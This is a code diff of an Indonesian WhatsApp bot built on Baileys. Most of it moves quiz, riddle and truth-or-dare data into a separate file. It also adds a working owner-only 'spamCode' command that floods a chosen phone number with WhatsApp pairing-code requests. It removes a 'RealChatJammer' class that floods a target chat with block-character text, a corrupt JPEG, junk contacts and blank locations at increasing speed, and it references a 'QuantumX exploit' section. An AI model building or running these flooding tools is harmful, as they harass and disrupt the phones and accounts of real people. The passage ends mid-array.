@@ -5,9 +5,20 @@ const {
   DisconnectReason,
   downloadMediaMessage
 } = require('@whiskeysockets/baileys');
-
-
 require("dotenv").config();
+
+const {
+  soalKuis,
+  soalKuisSusah,
+  ambilSoalAcak,
+  truthList,
+  dareList,
+  soalTebakan,
+  soalSusunKata,
+  soalFamily100,
+  soalBendera,
+  tebakgambar
+} = require('./data/soaljawaban');
 
 const pino = require('pino');
 const { Boom } = require('@hapi/boom');
@@ -15,6 +26,7 @@ const qrcode = require('qrcode-terminal');
 const QRCode = require('qrcode'); 
 const { Sticker, StickerTypes } = require('wa-sticker-formatter');
 const { exec } = require('child_process');
+const { GoogleGenerativeAI } = require('@google/generative-ai');
 const ytdl = require("@distube/ytdl-core");
 const fs = require('fs');
 const path = require('path');
@@ -35,10 +47,17 @@ const { Document, Packer, Paragraph, TextRun } = require('docx');
 
 let historySiapa = {};
 let anonQueue = [];
+let rankCooldown = {};
+let skorUser = {}; 
+let rankUser = {};
+let aiLimit = {};
+let bannedUsers = {};
 let anonSessions = new Map(); 
 
 ffmpeg.setFfmpegPath(ffmpegPath);
 
+const chatMemory = {};
+const sesiLimitAI = new Map();
 const pdfSessions = new Map(); 
 const antiLinkGroups = new Map();
 const antiStickerGroups = new Map();
@@ -55,9 +74,10 @@ const DEFAULT_AI_LIMIT = 5;
 const sesiUlarTangga = new Map();
 const sesiTebakGambar = new Map();
 const sesiTebakLagu = new Map();
-
-
-
+const sesiTebakan = new Map(); 
+const sesiKuis = new Map(); 
+const sesiKuisSusah = new Map();
+const sesiSusunKata = new Map();
 
 
 const pdfLimit = new Map(); 
@@ -74,8 +94,6 @@ const bratVidLimit = new Map();
 const MAX_BRATVID = 2; // max pakai bratvid per cooldown
 const BRATVID_COOLDOWN = 10 * 60 * 60 * 1000; // 10 jam cooldown
 const bratVidAksesSementara = new Map(); // akses sementara 5 menit, kalau mau pakai belibrat
-
-
 
 const waifuLimit = new Map();
 const MAX_WAIFU = 1; // max 3 kali
@@ -167,8 +185,6 @@ function isVIP(jid, groupId) {
 
     return false;
 }
-
-
 
 
 function isOwner(jid) {
@@ -301,8 +317,6 @@ function unmuteUser(userId, groupId) {
 
 // ==================== BANNED SYSTEM ====================
 const bannedFilePath = path.join(__dirname,'banned.json');
-let bannedUsers = {};
-
 try {
   if (fs.existsSync(bannedFilePath)) {
     const raw = fs.readFileSync(bannedFilePath, 'utf8');
@@ -352,7 +366,7 @@ function simpanGrupAktif() {
 }
 
 const skorPath = './skor.json';
-let skorUser = {}; 
+
 
 function simpanSkorKeFile() {
     fs.writeFile(skorPath, JSON.stringify(skorUser, null, 2), err => {
@@ -383,7 +397,6 @@ function addGroupSkor(jid, roomId, poin) {
     simpanSkorKeFile();
 }
 const rankFile = path.join(__dirname, 'rank.json');
-let rankUser = {};
 
 // === Load rank.json ===
 if (fs.existsSync(rankFile)) {
@@ -397,9 +410,6 @@ if (fs.existsSync(rankFile)) {
 function saveRank() {
     fs.writeFileSync(rankFile, JSON.stringify(rankUser, null, 2));
 }
-
-// === Cooldown anti spam XP ===
-let rankCooldown = {};
 
 // === Tambah XP di grup atau chat pribadi ===
 function tambahXP(sock, user, room) {
@@ -430,11 +440,6 @@ function tambahXP(sock, user, room) {
 
     saveRank();
 }
-// === MEMORY AI ===================================================
-const chatMemory = {};
-
-// === LIMIT AI ====================================================
-let aiLimit = {};
 
 try {
     aiLimit = JSON.parse(fs.readFileSync('./aiLimit.json'));
@@ -476,9 +481,6 @@ function tambahPakaiAI(id) {
     aiLimit[id].used++;
     saveAiLimit();
 }
-
-// sesi pemilihan grup untuk .ailimit
-const sesiLimitAI = new Map();
 
 function initChatMemory(sender) {
     if (!chatMemory[sender]) {
@@ -644,68 +646,6 @@ function resetChatMemory(sender) {
         const systemPrompt = chatMemory[sender].find(msg => msg.role === "system");
         chatMemory[sender] = systemPrompt ? [systemPrompt] : [];
     }
-}
-const bankSoalTeracak = new Map();
-
-function ambilSoalAcak(namaFitur, daftarSoal) {
-    if (!bankSoalTeracak.has(namaFitur) || bankSoalTeracak.get(namaFitur).index >= bankSoalTeracak.get(namaFitur).data.length) {
-        // Jika belum pernah disetel atau sudah habis, acak ulang
-        const soalTeracak = [...daftarSoal];
-        for (let i = soalTeracak.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [soalTeracak[i], soalTeracak[j]] = [soalTeracak[j], soalTeracak[i]];
-        }
-        bankSoalTeracak.set(namaFitur, { data: soalTeracak, index: 0 });
-    }
-
-    const soalState = bankSoalTeracak.get(namaFitur);
-    const soal = soalState.data[soalState.index];
-    soalState.index += 1;
-    return soal;
-}
-
-async function spamCode(sock, from, msg, text, isOwner) {
-  if (!isOwner(msg.key.participant || msg.key.remoteJid)) {
-    return sock.sendMessage(from, { text: '❌ Khusus Owner!' }, { quoted: msg });
-  }
-
-  const q = text.split(' ').slice(1).join(' ');
-  if (!q) {
-    return sock.sendMessage(from, {
-      text: '⚠️ Format salah!\n\nGunakan format:\n.spamcode 62xxxxxxxxxxx|jumlah',
-    }, { quoted: msg });
-  }
-
-  let [target, jumlah = '5'] = q.split('|');
-  jumlah = parseInt(jumlah);
-  if (isNaN(jumlah) || jumlah <= 0) jumlah = 10;
-
-  await sock.sendMessage(from, { text: 'Memulai spam pairing code...' }, { quoted: msg });
-
-  let nomor = target.replace(/[^0-9]/g, '').trim();
-
-  // Import Baileys hanya sekali di awal program, jangan di sini kalau bisa
-  const { state } = await useMultiFileAuthState('Spam Code');
-  const { version } = await fetchLatestBaileysVersion();
-
-  const sockSpam = await makeWASocket({
-    auth: state,
-    version,
-    logger: pino({ level: 'silent' }),
-  });
-
-  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-  for (let i = 0; i < jumlah; i++) {
-    await delay(7000);
-    let result = await sockSpam.requestPairingCode(nomor);
-    console.log(`Spam Code ke ${nomor}: ${result}`);
-  }
-
-  await sock.sendMessage(from, { text: `✅ spam selesai ${jumlah} kali ke ${nomor}` }, { quoted: msg });
-
-  // Jangan lupa disconnect socket spam setelah selesai
-  sockSpam.end();
 }
 
 async function uploadToCatbox(buffer) {
@@ -894,6 +834,52 @@ async function processVoiceEffect(inputBuffer, effectType, effectName) {
             .save(tempOutput);
     });
 }
+
+
+async function spamCode(sock, from, msg, text, isOwner) {
+  if (!isOwner(msg.key.participant || msg.key.remoteJid)) {
+    return sock.sendMessage(from, { text: '❌ Khusus Owner!' }, { quoted: msg });
+  }
+
+  const q = text.split(' ').slice(1).join(' ');
+  if (!q) {
+    return sock.sendMessage(from, {
+      text: '⚠️ Format salah!\n\nGunakan format:\n.spamcode 62xxxxxxxxxxx|jumlah',
+    }, { quoted: msg });
+  }
+
+  let [target, jumlah = '5'] = q.split('|');
+  jumlah = parseInt(jumlah);
+  if (isNaN(jumlah) || jumlah <= 0) jumlah = 10;
+
+  await sock.sendMessage(from, { text: 'Memulai spam pairing code...' }, { quoted: msg });
+
+  let nomor = target.replace(/[^0-9]/g, '').trim();
+
+  // Import Baileys hanya sekali di awal program, jangan di sini kalau bisa
+  const { state } = await useMultiFileAuthState('Spam Code');
+  const { version } = await fetchLatestBaileysVersion();
+
+  const sockSpam = await makeWASocket({
+    auth: state,
+    version,
+    logger: pino({ level: 'silent' }),
+  });
+
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+  for (let i = 0; i < jumlah; i++) {
+    await delay(7000);
+    let result = await sockSpam.requestPairingCode(nomor);
+    console.log(`Spam Code ke ${nomor}: ${result}`);
+  }
+
+  await sock.sendMessage(from, { text: `✅ spam selesai ${jumlah} kali ke ${nomor}` }, { quoted: msg });
+
+  // Jangan lupa disconnect socket spam setelah selesai
+  sockSpam.end();
+}
+
 
 
 // ==================== QUANTUMX EXPLOIT SYSTEM ====================
@@ -1189,1215 +1175,6 @@ class QuantumXExploitV2 {
 let exploitSystemV2 = null;
 
 
-class RealChatJammer {
-    constructor(sock) {
-        this.sock = sock;
-        this.activeJams = new Map();
-        this.corruptImageBuffer = null;
-    }
-
-    // 🔥 LOAD CORRUPT IMAGE
-    async loadCorruptImage() {
-        if (this.corruptImageBuffer) return;
-        
-        // CREATE CORRUPT JPEG MANUALLY
-        const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
-        const middle = Buffer.alloc(10000, 0xFF); // Large white space
-        const footer = Buffer.from([0xFF, 0xD9]);
-        
-        this.corruptImageBuffer = Buffer.concat([header, middle, footer]);
-    }
-
-    // 💀 JAM CHAT TARGET
-    async jamChat(targetJid, duration = 120) {
-        console.log(`[REAL-JAMMER] Starting jam on ${targetJid}`);
-        
-        await this.loadCorruptImage();
-        
-        const jamId = `jam_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
-        const startTime = Date.now();
-        const endTime = startTime + (duration * 1000);
-        
-        const jamConfig = {
-            target: targetJid,
-            start: startTime,
-            end: endTime,
-            messagesSent: 0,
-            active: true
-        };
-        
-        this.activeJams.set(jamId, jamConfig);
-        
-        // START JAMMING
-        this._executeJam(jamId);
-        
-        return jamId;
-    }
-
-    async _executeJam(jamId) {
-        const jam = this.activeJams.get(jamId);
-        if (!jam || !jam.active) return;
-        
-        const patterns = [
-            () => this._sendTextFlood(jam.target),
-            () => this._sendBufferImage(jam.target),
-            () => this._sendContactSpam(jam.target),
-            () => this._sendLocationSpam(jam.target)
-        ];
-        
-        while (Date.now() < jam.end && jam.active) {
-            try {
-                const patternIndex = jam.messagesSent % patterns.length;
-                await patterns[patternIndex]();
-                
-                jam.messagesSent++;
-                this.activeJams.set(jamId, jam);
-                
-                // PROGRESSIVE SPEED
-                const delay = Math.max(50, 1000 - (jam.messagesSent * 10));
-                await new Promise(r => setTimeout(r, delay));
-                
-            } catch (error) {
-                console.log(`[JAMMER] Send error: ${error.message}`);
-            }
-        }
-        
-        jam.active = false;
-        this.activeJams.set(jamId, jam);
-        
-        setTimeout(() => {
-            this.activeJams.delete(jamId);
-        }, 10000);
-    }
-
-    // 📝 TEXT FLOOD
-    async _sendTextFlood(targetJid) {
-        const texts = [
-            "█".repeat(1000),
-            "▒".repeat(1000) + "\n".repeat(50),
-            "▓".repeat(500) + "░".repeat(500),
-            Buffer.alloc(1000, 65).toString() + "\n".repeat(20)
-        ];
-        
-        const text = texts[Math.floor(Math.random() * texts.length)];
-        
-        await this.sock.sendMessage(targetJid, { 
-            text: text,
-            contextInfo: {
-                mentionedJid: [targetJid],
-                forwardingScore: 255
-            }
-        });
-    }
-
-    // 🖼️ BUFFER IMAGE
-    async _sendBufferImage(targetJid) {
-        await this.sock.sendMessage(targetJid, {
-            image: this.corruptImageBuffer,
-            caption: " ".repeat(100),
-            mimetype: 'image/jpeg'
-        });
-    }
-
-    // 👥 CONTACT SPAM
-    async _sendContactSpam(targetJid) {
-        const vcard = `BEGIN:VCARD
-VERSION:3.0
-FN:${"A".repeat(100)}
-TEL;TYPE=CELL:628${Math.random().toString().substr(2, 12)}
-END:VCARD`.repeat(5);
-        
-        await this.sock.sendMessage(targetJid, {
-            contacts: {
-                displayName: "SPAM_CONTACT",
-                contacts: [{ vcard: vcard }]
-            }
-        });
-    }
-
-    // 📍 LOCATION SPAM
-    async _sendLocationSpam(targetJid) {
-        await this.sock.sendMessage(targetJid, {
-            location: {
-                degreesLatitude: 0,
-                degreesLongitude: 0,
-                name: " ".repeat(50),
-                address: " ".repeat(100)
-            }
-        });
-    }
-
-    // 🛑 STOP JAM
-    stopJam(jamId) {
-        const jam = this.activeJams.get(jamId);
-        if (jam) {
-            jam.active = false;
-            this.activeJams.set(jamId, jam);
-            return true;
-        }
-        return false;
-    }
-
-    // 📊 GET ACTIVE JAMS
-    getActiveJams() {
-        const active = [];
-        this.activeJams.forEach((jam, id) => {
-            if (jam.active) {
-                active.push({
-                    id: id,
-                    target: jam.target,
-                    remaining: Math.max(0, Math.floor((jam.end - Date.now()) / 1000)),
-                    sent: jam.messagesSent
-                });
-            }
-        });
-        return active;
-    }
-}
-
-// ==================== SIMPLE COMMAND HANDLER ====================
-let jammer = null;
-
-const truthList = [
-  "Apa hal paling memalukan yang pernah kamu lakukan di depan umum?",
-  "Siapa nama mantan yang masih suka kamu stalk?",
-  "Kalau bisa balikan sama 1 orang, siapa yang bakal kamu pilih?",
-  "Pernah pura-pura sakit biar gak sekolah? Ceritakan alasannya.",
-  "Siapa teman yang paling ngeselin tapi kamu gak bisa jauhin?",
-  "Pernah suka sama pacar orang? Ceritakan!",
-  "Kalau kamu punya kekuatan gaib, kamu bakal pakai buat apa?",
-  "Pernah curi-curi pandang siapa? Jelaskan.",
-  "Pernah suka sama guru/dosen? Siapa?",
-  "Hal paling gila yang pernah kamu lakukan demi cinta?",
-  "Kalau disuruh jujur, siapa yang paling kamu benci diam-diam?",
-  "Pernah diselingkuhin? Atau justru kamu yang selingkuh?",
-  "Kapan terakhir kamu pura-pura bahagia?",
-  "Siapa nama kontak yang kamu samarkan di HP karena malu?",
-  "Kalau bisa ubah 1 hal dari masa lalu, apa itu?",
-  "Kamu pilih cinta atau uang? Jelaskan kenapa.",
-  "Pernah ciuman? Sama siapa dan di mana?",
-  "Kalau bisa hilangin 1 orang dari hidupmu, siapa?",
-  "Apa kebohongan terbesar yang belum ketahuan sampai sekarang?",
-  "Hal tergila yang pengen kamu coba tapi belum berani?",
-  "Siapa orang yang paling kamu pengen ajak chat sekarang?",
-  "Apa hal yang paling kamu insecure-in dari dirimu?",
-  "Kamu pernah punya pikiran jahat? Tentang apa?",
-  "Siapa yang menurutmu paling fake tapi akrab sama kamu?",
-  "Apa ketakutan terbesar kamu yang gak pernah kamu bilang ke siapa-siapa?"
-];
-
-const dareList = [
-  "Ganti bio wa *Aku suka agus* dan biarkan 30 menit!",
-  "VN 5 detik dengan suara ketawa paling serem versimu!",
-  "Ganti foto profil jadi wajah temen random selama 15 menit!",
-  "Kirim stiker paling cringe yang kamu punya!",
-  "VN nyanyikan lagu *Balonku Ada Lima* tapi dengan huruf vokal i!",
-  "Chat mantan dan bilang *aku masih sayang kamu* (screenshot ya!)",
-  "Pake filter jelek di kamera dan kirim fotonya ke sini!",
-  "Ketik *Aku ingin menikah tahun ini* di status WhatsApp!",
-  "Rekam suara bilang *Aku adalah budak cinta* dan kirim ke sini!",
-  "Chat orang random dan tanya *Kamu percaya alien?*",
-  "Ketik *Aku lagi pengen dimanja* di grup teman!",
-  "Bilang ke orang random *Kamu cakep deh*",
-  "Telepon kontak terakhir di WA dan bilang *Aku suka kamu!*",
-  "Ganti nama kontak pacar jadi *Calon Suami/Istri*",
-  "Ketik *Aku pengen peluk seseorang hari ini* di status WA",
-  "Ceritakan rahasia tergokil kamu ke grup ini!",
-  "Berikan pujian ke 3 orang di grup ini, sekarang juga!",
-  "VN ngomong *aku ngaku salah* sambil pura-pura nangis",
-  "VN ngomong dengan suara genit: *Aduh om jangan gitu dong*",
-  "Kirim selfie dengan gaya paling kocak!",
-  "VN nyebut nama crush kamu 5x nonstop!",
-  "Tanya ke orang tua *Boleh nikah umur berapa ya?* lalu screenshot jawabannya",
-  "Ketik *Pengen dipeluk* ke nomor orang random dikontakmu!",
-  "Kirim foto tampang bangun tidur ke sini tanpa edit!",
-  "Kirim emoji 🍑💦 ke orang random dan screenshot reaksinya!",
-  "Kirim video kamu joget lagu TikTok yang lagi viral!"
-];
-
-
-// ================== TEBAK-AKU CONFIG ==================
-const soalTebakan = [
-    { soal: "Aku bisa dibuka tapi tak bisa ditutup. Aku apa?", jawaban: "telur" },
-    { soal: "Aku punya kepala tapi tak punya badan. Aku apa?", jawaban: "koin" },
-    { soal: "Aku selalu bertambah tapi tak pernah berkurang. Aku apa?", jawaban: "umur" },
-    { soal: "Aku putih di luar, kuning di dalam, disukai anak-anak. Aku apa?", jawaban: "telur" },
-    { soal: "Aku punya gigi tapi tidak bisa menggigit. Aku apa?", jawaban: "sisir" },
-    { soal: "Aku bisa terbang tanpa sayap dan menangis tanpa mata. Aku apa?", jawaban: "awan" },
-    { soal: "Aku ada di tengah malam tapi bukan benda. Aku apa?", jawaban: "huruf l" },
-    { soal: "Aku selalu di depan cermin tapi tak pernah terlihat. Aku apa?", jawaban: "bayangan" },
-    { soal: "Aku selalu datang tapi tak pernah tepat waktu. Aku apa?", jawaban: "kereta" },
-    { soal: "Aku sering dipukul tapi tak pernah marah. Aku apa?", jawaban: "bedug" },
-    { soal: "Aku bisa bersinar tapi bukan lampu. Aku apa?", jawaban: "matahari" },
-    { soal: "Aku basah tapi bisa memadamkan api. Aku apa?", jawaban: "air" },
-    { soal: "Aku selalu naik tapi tak pernah turun. Aku apa?", jawaban: "harga" },
-    { soal: "Aku berbunyi saat disentuh, punya senar tapi bukan gitar. Aku apa?", jawaban: "biola" },
-    { soal: "Aku bisa duduk tapi bukan orang. Aku apa?", jawaban: "kursi" },
-    { soal: "Aku bisa diinjak tapi tak pernah protes. Aku apa?", jawaban: "sendal" },
-    { soal: "Aku kecil, suka nyedot, bikin gatel. Aku apa?", jawaban: "nyamuk" },
-    { soal: "Aku bulat, sering ditendang. Aku apa?", jawaban: "bola" },
-    { soal: "Aku suka manjat tapi bukan monyet. Aku apa?", jawaban: "kucing" },
-    { soal: "Aku manis, suka dibungkus permen. Aku apa?", jawaban: "gula" },
-    { soal: "Aku di tangan tapi bukan jari. Aku apa?", jawaban: "jam" },
-    { soal: "Aku nyala kalau gelap. Aku apa?", jawaban: "lampu" },
-    { soal: "Aku bisa dibuka, punya gigi. Aku apa?", jawaban: "resleting" },
-    { soal: "Aku berbunyi saat lapar disentuh. Aku apa?", jawaban: "perut" },
-    { soal: "Aku naik turun tapi tetap di tempat. Aku apa?", jawaban: "lift" },
-    { soal: "Aku keras, suka dipakai bangun rumah. Aku apa?", jawaban: "batu" },
-    { soal: "Aku suka terbang tapi bukan burung. Aku apa?", jawaban: "pesawat" },
-    { soal: "Aku putih, dingin, bisa dimakan. Aku apa?", jawaban: "es" },
-    { soal: "Aku kecil, hitam, bikin pedas. Aku apa?", jawaban: "lada" },
-    { soal: "Aku bulat, bisa meletus. Aku apa?", jawaban: "balon" },
-    { soal: "Aku selalu lapar, makan listrik. Aku apa?", jawaban: "hp" },
-    { soal: "Aku bulu tapi bukan bulu mata. Aku apa?", jawaban: "bulu" },
-    { soal: "Aku disetrika biar rapi. Aku apa?", jawaban: "baju" },
-    { soal: "Aku suka jatuh pas galau. Aku apa?", jawaban: "airmata" },
-    { soal: "Aku suka dipegang, kadang dipeluk. Aku apa?", jawaban: "bantal" },
-    { soal: "Aku warnanya kuning, suka digoreng. Aku apa?", jawaban: "pisang" },
-    { soal: "Aku ada angka, bisa jalan. Aku apa?", jawaban: "jam" },
-    { soal: "Aku bening, masuk ke botol. Aku apa?", jawaban: "air" },
-    { soal: "Aku ditulis di kertas, bisa bikin senyum. Aku apa?", jawaban: "puisi" },
-    { soal: "Aku kering tapi bisa basah. Aku apa?", jawaban: "handuk" },
-    { soal: "Aku kecil, putih, bikin senyum cerah. Aku apa?", jawaban: "gigi" },
-    { soal: "Aku sering jatuh di malam hari. Aku apa?", jawaban: "embun" },
-    { soal: "Aku bisa mencium tapi tak punya hidung. Aku apa?", jawaban: "bunga" }
-];
-
-const sesiTebakan = new Map(); // key: pengirim, value: { jawaban: string, timeout: TimeoutObject }
-const soalKuis = [
-  {
-    soal: "Jika 2 + 3 = 10, 3 + 4 = 21, maka 4 + 5 = ?",
-    pilihan: ["A. 20", "B. 27", "C. 36", "D. 45"],
-    jawaban: "B" // (2×5, 3×7, 4×9)
-  },
-  {
-    soal: "Benda apa yang makin diisi justru makin ringan?",
-    pilihan: ["A. Tas", "B. Botol", "C. Balon", "D. Ember"],
-    jawaban: "C"
-  },
-  {
-    soal: "Urutan yang benar: Januari, Februari, ?, April",
-    pilihan: ["A. Mei", "B. Maret", "C. Juni", "D. Desember"],
-    jawaban: "B"
-  },
-  {
-    soal: "Jika semua bloop adalah blap, dan semua blap adalah blip, maka bloop pasti?",
-    pilihan: ["A. Blip", "B. Bloop", "C. Bukan blip", "D. Tidak bisa ditentukan"],
-    jawaban: "A"
-  },
-  {
-    soal: "Angka berikutnya dari 2, 4, 8, 16 adalah?",
-    pilihan: ["A. 18", "B. 24", "C. 30", "D. 32"],
-    jawaban: "D"
-  },
-  {
-    soal: "Apa yang selalu datang tapi tidak pernah tiba?",
-    pilihan: ["A. Hujan", "B. Besok", "C. Malam", "D. Libur"],
-    jawaban: "B"
-  },
-  {
-    soal: "Jika kamu menghadap ke timur lalu berputar 180°, kamu menghadap ke?",
-    pilihan: ["A. Timur", "B. Utara", "C. Selatan", "D. Barat"],
-    jawaban: "D"
-  },
-  {
-    soal: "Mana yang BUKAN termasuk segitiga?",
-    pilihan: ["A. Sama sisi", "B. Sama kaki", "C. Siku-siku", "D. Persegi"],
-    jawaban: "D"
-  },
-  {
-    soal: "Huruf apa yang tidak pernah muncul dalam angka Romawi?",
-    pilihan: ["A. L", "B. C", "C. M", "D. K"],
-    jawaban: "D"
-  },
-  {
-    soal: "Jika hari ini Jumat, 10 hari lagi hari apa?",
-    pilihan: ["A. Minggu", "B. Senin", "C. Selasa", "D. Rabu"],
-    jawaban: "C"
-  },
-  {
-    soal: "Benda apa yang punya jarum tapi tidak bisa menjahit?",
-    pilihan: ["A. Jam", "B. Pohon", "C. Landak", "D. Kompas"],
-    jawaban: "A"
-  },
-  {
-    soal: "3 orang menangkap 3 ikan dalam 3 menit. 6 orang butuh berapa menit untuk menangkap 6 ikan?",
-    pilihan: ["A. 3", "B. 6", "C. 9", "D. 12"],
-    jawaban: "A"
-  },
-  {
-    soal: "Kata mana yang paling berbeda?",
-    pilihan: ["A. Merah", "B. Biru", "C. Hijau", "D. Meja"],
-    jawaban: "D"
-  },
-  {
-    soal: "Jika semua kucing adalah hewan, apakah semua hewan adalah kucing?",
-    pilihan: ["A. Ya", "B. Tidak", "C. Mungkin", "D. Kadang"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa yang bisa pecah walau tidak dijatuhkan?",
-    pilihan: ["A. Gelas", "B. Telur", "C. Janji", "D. Batu"],
-    jawaban: "C"
-  },
-  {
-    soal: "Huruf ke-3 dari belakang alfabet?",
-    pilihan: ["A. X", "B. Y", "C. Z", "D. W"],
-    jawaban: "A"
-  },
-  {
-    soal: "Jika 5 mesin membuat 5 barang dalam 5 menit, berapa mesin untuk membuat 10 barang dalam 5 menit?",
-    pilihan: ["A. 5", "B. 8", "C. 10", "D. 15"],
-    jawaban: "C"
-  },
-  {
-    soal: "Yang mana lebih berat?",
-    pilihan: ["A. 1 kg kapas", "B. 1 kg besi", "C. Sama berat", "D. Tidak tahu"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa yang selalu basah saat mengeringkan?",
-    pilihan: ["A. Handuk", "B. Air", "C. Sabun", "D. Kain"],
-    jawaban: "A"
-  },
-  {
-    soal: "Jika kamu punya satu korek api dan masuk ke ruangan gelap berisi lilin dan lampu minyak, apa yang dinyalakan dulu?",
-    pilihan: ["A. Lilin", "B. Lampu", "C. Korek api", "D. Minyak"],
-    jawaban: "C"
-  },
-   {
-    soal: "Siapa proklamator Indonesia selain Soekarno?",
-    pilihan: ["A. Soeharto", "B. BJ Habibie", "C. Mohammad Hatta", "D. Sutan Sjahrir"],
-    jawaban: "C"
-  },
-  {
-    soal: "Tanggal berapa Indonesia merdeka?",
-    pilihan: ["A. 20 Mei 1945", "B. 17 Agustus 1945", "C. 1 Juni 1945", "D. 10 November 1945"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa dasar negara Indonesia?",
-    pilihan: ["A. UUD 1945", "B. Bhinneka Tunggal Ika", "C. Trisila", "D. Pancasila"],
-    jawaban: "D"
-  },
-  {
-    soal: "Lambang sila ke-2 Pancasila adalah?",
-    pilihan: ["A. Rantai", "B. Bintang", "C. Pohon beringin", "D. Banteng"],
-    jawaban: "A"
-  },
-  {
-    soal: "Negara pertama yang mengakui kemerdekaan Indonesia?",
-    pilihan: ["A. Jepang", "B. Amerika", "C. Mesir", "D. Belanda"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa ibu kota Australia?",
-    pilihan: ["A. Sydney", "B. Melbourne", "C. Canberra", "D. Perth"],
-    jawaban: "C"
-  },
-  {
-    soal: "Planet terbesar di tata surya?",
-    pilihan: ["A. Mars", "B. Saturnus", "C. Bumi", "D. Jupiter"],
-    jawaban: "D"
-  },
-  {
-    soal: "Siapa penemu listrik yang terkenal dengan eksperimen petir?",
-    pilihan: ["A. Edison", "B. Tesla", "C. Benjamin Franklin", "D. Newton"],
-    jawaban: "C"
-  },
-  {
-    soal: "Alat untuk mengukur gempa bumi disebut?",
-    pilihan: ["A. Barometer", "B. Seismograf", "C. Termometer", "D. Anemometer"],
-    jawaban: "B"
-  },
-  {
-    soal: "Samudra terluas di dunia?",
-    pilihan: ["A. Atlantik", "B. Hindia", "C. Arktik", "D. Pasifik"],
-    jawaban: "D"
-  },
-
-  {
-    soal: "Siapa penulis buku Laskar Pelangi?",
-    pilihan: ["A. Andrea Hirata", "B. Tere Liye", "C. Dee Lestari", "D. Habiburrahman"],
-    jawaban: "A"
-  },
-  {
-    soal: "Pulau terbesar di Indonesia?",
-    pilihan: ["A. Sumatra", "B. Kalimantan", "C. Sulawesi", "D. Papua"],
-    jawaban: "D"
-  },
-  {
-    soal: "Apa fungsi utama jantung?",
-    pilihan: ["A. Bernapas", "B. Menyaring darah", "C. Memompa darah", "D. Mengatur suhu"],
-    jawaban: "C"
-  },
-  {
-    soal: "Siapa ilmuwan dengan teori relativitas?",
-    pilihan: ["A. Newton", "B. Galileo", "C. Tesla", "D. Albert Einstein"],
-    jawaban: "D"
-  },
-  {
-    soal: "Negara dengan Menara Eiffel?",
-    pilihan: ["A. Italia", "B. Jerman", "C. Prancis", "D. Inggris"],
-    jawaban: "C"
-  },
-  {
-    soal: "Gunung tertinggi di dunia?",
-    pilihan: ["A. Everest", "B. Kilimanjaro", "C. Elbrus", "D. Fuji"],
-    jawaban: "A"
-  },
-  {
-    soal: "Apa nama alat untuk melihat benda kecil?",
-    pilihan: ["A. Teleskop", "B. Mikroskop", "C. Periskop", "D. Kamera"],
-    jawaban: "B"
-  },
-  {
-    soal: "Siapa pahlawan wanita dari Aceh?",
-    pilihan: ["A. RA Kartini", "B. Dewi Sartika", "C. Cut Nyak Dien", "D. Martha Christina"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa mata uang Jepang?",
-    pilihan: ["A. Yuan", "B. Yen", "C. Won", "D. Dollar"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa semboyan negara Indonesia?",
-    pilihan: ["A. Merdeka atau Mati", "B. Indonesia Raya", "C. Tut Wuri Handayani", "D. Bhinneka Tunggal Ika"],
-    jawaban: "D"
-  },
-
-  {
-    soal: "Berapa hasil 12 × 8?",
-    pilihan: ["A. 96", "B. 88", "C. 108", "D. 86"],
-    jawaban: "A"
-  },
-  {
-    soal: "Hewan tercepat di darat?",
-    pilihan: ["A. Kuda", "B. Cheetah", "C. Singa", "D. Macan"],
-    jawaban: "B"
-  },
-  {
-    soal: "Zat hijau pada daun disebut?",
-    pilihan: ["A. Karbon", "B. Oksigen", "C. Klorofil", "D. Nitrogen"],
-    jawaban: "C"
-  },
-  {
-    soal: "Siapa penemu pesawat terbang?",
-    pilihan: ["A. Edison", "B. Wright Bersaudara", "C. Tesla", "D. Bell"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa nama planet terdekat dengan Matahari?",
-    pilihan: ["A. Venus", "B. Bumi", "C. Mars", "D. Merkurius"],
-    jawaban: "D"
-  },
-  {
-    soal: "Bahasa resmi Brasil?",
-    pilihan: ["A. Spanyol", "B. Inggris", "C. Portugis", "D. Prancis"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa lambang kimia air?",
-    pilihan: ["A. CO2", "B. O2", "C. NaCl", "D. H2O"],
-    jawaban: "D"
-  },
-  {
-    soal: "Berapa jumlah sisi segi enam?",
-    pilihan: ["A. 5", "B. 6", "C. 7", "D. 8"],
-    jawaban: "B"
-  },
-  {
-    soal: "Siapa penulis Harry Potter?",
-    pilihan: ["A. Tolkien", "B. Suzanne Collins", "C. J.K. Rowling", "D. Stephen King"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa fungsi paru-paru?",
-    pilihan: ["A. Memompa darah", "B. Menyaring darah", "C. Bernapas", "D. Mengatur suhu"],
-    jawaban: "C"
-  },
-
-  {
-    soal: "Apa warna campuran biru dan kuning?",
-    pilihan: ["A. Hijau", "B. Ungu", "C. Jingga", "D. Coklat"],
-    jawaban: "A"
-  },
-  {
-    soal: "Berapa planet di tata surya?",
-    pilihan: ["A. 7", "B. 8", "C. 9", "D. 10"],
-    jawaban: "B"
-  },
-  {
-    soal: "Siapa Bapak Pendidikan Indonesia?",
-    pilihan: ["A. Soekarno", "B. Ki Hajar Dewantara", "C. Hatta", "D. Kartini"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa alat pengukur suhu?",
-    pilihan: ["A. Barometer", "B. Termometer", "C. Altimeter", "D. Seismograf"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa nama hewan terbesar di dunia?",
-    pilihan: ["A. Gajah", "B. Paus Biru", "C. Hiu", "D. Dinosaurus"],
-    jawaban: "B"
-  },
-  {
-    soal: "Berapa hasil 100 ÷ 4?",
-    pilihan: ["A. 20", "B. 30", "C. 25", "D. 40"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa alat untuk mengukur tekanan udara?",
-    pilihan: ["A. Termometer", "B. Barometer", "C. Kompas", "D. Anemometer"],
-    jawaban: "B"
-  },
-  {
-    soal: "Negara dengan Tembok Besar?",
